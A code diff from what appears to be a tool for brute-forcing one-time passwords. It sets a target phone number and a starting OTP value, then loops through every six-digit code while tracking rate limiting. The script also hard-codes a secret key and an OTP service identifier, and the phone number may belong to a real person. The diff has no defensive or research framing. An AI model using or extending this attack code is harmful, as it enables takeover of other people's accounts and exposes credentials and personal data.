@@ -11,7 +11,7 @@ SECRET_KEY = "751a276cae97ac29e91819106ebb62f0"
 APP_VER = "5.0.0"
 
 # Target Details (Main.py is value ko dynamically change karega)
-PHONE_NUMBER = "7357580789"
+PHONE_NUMBER = "7357580788"
 
 # OTP Sender Config (PasswordOTP.py se liya gaya)
 OTP_SID = "88ceb0ce80f72a67556e02d2fd06cb13"
@@ -179,7 +179,7 @@ async def brute_force_otp():
         
         rate_limit_count = 0
         tested_count = 0
-        i = 0  # Starting OTP
+        i = 211000  # Starting OTP
         
         try:
             while i < 1000000:
